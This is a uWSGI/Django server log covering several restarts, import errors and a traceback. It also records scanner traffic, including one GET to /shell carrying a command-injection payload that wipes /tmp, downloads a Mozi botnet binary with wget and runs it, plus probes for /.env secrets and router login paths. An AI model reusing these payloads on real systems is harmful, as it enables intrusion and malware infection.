*** Starting uWSGI 2.0.12-debian (64bit) on [Thu Feb  4 18:20:17 2021] ***
compiled with version: 5.4.0 20160609 on 28 September 2018 15:49:44
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/bin/uwsgi-core
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72768 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
no request plugin is loaded, you will not be able to manage requests.
you may need to install the package for your language of choice, or simply load it with --plugin.
!!!!!!!!!!! END OF WARNING !!!!!!!!!!
spawned uWSGI worker 1 (and the only) (pid: 6705, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Feb  4 18:37:59 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x24bc390
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72904 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
*** no app loaded. going in full dynamic mode ***
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 9229, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb  6 08:16:47 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x1ff0390
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72904 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
*** no app loaded. going in full dynamic mode ***
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 15987, cores: 1)
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
VACUUM WARNING: unix socket /home/dongkeydev/bbubbit/bbubbit.sock changed inode. Skip removal
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 05:19:52 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x24222e0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72904 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
*** no app loaded. going in full dynamic mode ***
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2648, cores: 1)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/1] 211.49.123.6 () {42 vars in 772 bytes} [Sun Feb  7 05:21:49 2021] GET / => generated 21 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/2] 211.49.123.6 () {42 vars in 708 bytes} [Sun Feb  7 05:21:50 2021] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/3] 162.142.125.40 () {28 vars in 309 bytes} [Sun Feb  7 05:50:48 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/4] 162.142.125.40 () {34 vars in 441 bytes} [Sun Feb  7 05:50:48 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/5] 139.162.106.181 () {32 vars in 399 bytes} [Sun Feb  7 08:10:15 2021] GET / => generated 21 bytes in 10 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/6] 89.248.168.108 () {48 vars in 873 bytes} [Sun Feb  7 08:37:54 2021] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/7] 83.97.20.30 () {30 vars in 330 bytes} [Sun Feb  7 09:06:38 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/8] 83.97.20.30 () {30 vars in 329 bytes} [Sun Feb  7 09:07:35 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/9] 103.90.205.27 () {32 vars in 462 bytes} [Sun Feb  7 09:39:32 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/10] 89.248.168.240 () {34 vars in 401 bytes} [Sun Feb  7 09:56:00 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/11] 197.254.106.146 () {32 vars in 470 bytes} [Sun Feb  7 10:35:59 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/12] 223.149.52.13 () {34 vars in 639 bytes} [Sun Feb  7 10:37:35 2021] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/13] 164.52.24.163 () {36 vars in 558 bytes} [Sun Feb  7 11:39:56 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/14] 89.248.168.108 () {48 vars in 873 bytes} [Sun Feb  7 12:03:53 2021] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/15] 103.28.70.87 () {36 vars in 520 bytes} [Sun Feb  7 12:29:34 2021] GET /.env => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/16] 103.28.70.87 () {40 vars in 627 bytes} [Sun Feb  7 12:29:34 2021] POST / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/17] 200.105.207.182 () {32 vars in 463 bytes} [Sun Feb  7 12:34:18 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/18] 162.255.117.87 () {36 vars in 522 bytes} [Sun Feb  7 13:34:49 2021] GET /.env => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/19] 162.255.117.87 () {40 vars in 629 bytes} [Sun Feb  7 13:34:50 2021] POST / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/20] 218.59.21.136 () {38 vars in 488 bytes} [Sun Feb  7 13:48:39 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/21] 171.5.163.244 () {32 vars in 461 bytes} [Sun Feb  7 16:13:59 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/22] 74.82.47.4 () {28 vars in 302 bytes} [Sun Feb  7 16:34:27 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
--- no python application found, check your startup logs for errors ---
[pid: 2648|app: -1|req: -1/23] 192.241.218.64 () {34 vars in 392 bytes} [Sun Feb  7 16:50:39 2021] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:27:41 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x1015460
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x1015460 pid: 2619 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
spawned uWSGI master process (pid: 2619)
spawned uWSGI worker 1 (pid: 2640, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:28:20 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x23be470
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x23be470 pid: 2701 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 2701)
spawned uWSGI worker 1 (pid: 2708, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:39:12 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x23ae430
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x23ae430 pid: 3968 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 3968)
spawned uWSGI worker 1 (pid: 3972, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:41:57 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:40:59
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /home/dongkeydev/django/bin/uwsgi
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x1c910a0
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1c910a0 pid: 4265 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 4265)
spawned uWSGI worker 1 (pid: 4272, cores: 1)
Internal Server Error: /boaform/admin/formLogin
Traceback (most recent call last):
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
    response = get_response(request)
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/utils/deprecation.py", line 113, in __call__
    response = self.process_request(request)
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/urls/resolvers.py", line 545, in resolve
    for pattern in self.url_patterns:
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/urls/resolvers.py", line 589, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/home/dongkeydev/django/lib/python3.6/site-packages/django/urls/resolvers.py", line 582, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "/home/dongkeydev/bbubbit/BBUBBIT3/urls.py", line 18, in <module>
    from RestApi.views import ListGetStockView, GetStockPostView, GetStock
  File "/home/dongkeydev/bbubbit/RestApi/views.py", line 13, in <module>
    from .GetIndicesFuture import *
ModuleNotFoundError: No module named 'RestApi.GetIndicesFuture'
[pid: 4272|app: 0|req: 1/1] 89.248.168.108 () {48 vars in 873 bytes} [Sun Feb  7 17:42:40 2021] POST /boaform/admin/formLogin => generated 136266 bytes in 1068 msecs (HTTP/1.1 500) 3 headers in 126 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:46:57 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:40:59
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /home/dongkeydev/django/bin/uwsgi
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x2255080
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x2255080 pid: 4818 (default app)
spawned uWSGI master process (pid: 4818)
spawned uWSGI worker 1 (pid: 4832, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:47:16 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:37:08
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x2231430
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x2231430 pid: 4876 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
spawned uWSGI master process (pid: 4876)
spawned uWSGI worker 1 (pid: 4880, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:47:45 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:40:59
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /home/dongkeydev/django/bin/uwsgi
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 3
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x179c130
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 145808 bytes (142 KB) for 1 cores
*** Operational MODE: single process ***
ModuleNotFoundError: No module named 'bbubbit'
unable to load app 0 (mountpoint='') (callable not found or import error)
WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x179c130 pid: 4930 (default app)
spawned uWSGI master process (pid: 4930)
spawned uWSGI worker 1 (pid: 4944, cores: 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Feb  7 17:48:09 2021] ***
compiled with version: 5.4.0 20160609 on 04 February 2021 18:40:59
os: Linux-4.15.0-1092-gcp #105~16.04.1-Ubuntu SMP Wed Jan 20 09:27:40 UTC 2021
nodename: bbubbit
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /home/dongkeydev/bbubbit
detected binary path: /home/dongkeydev/django/bin/uwsgi
chdir() to /home/dongkeydev/bbubbit
your processes number limit is 2064
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :bbubbit.sock fd 3
uwsgi socket 1 bound to UNIX address /home/dongkeydev/bbubbit/bbubbit.sock fd 4
Python version: 3.6.12 (default, Aug 18 2020, 02:08:22)  [GCC 5.4.0 20160609]
PEP 405 virtualenv detected: /home/dongkeydev/django
Set PythonHome to /home/dongkeydev/django
Python main interpreter initialized at 0x1aeb310
python threads support enabled
your server socket listen backlog is limited to 100 connections
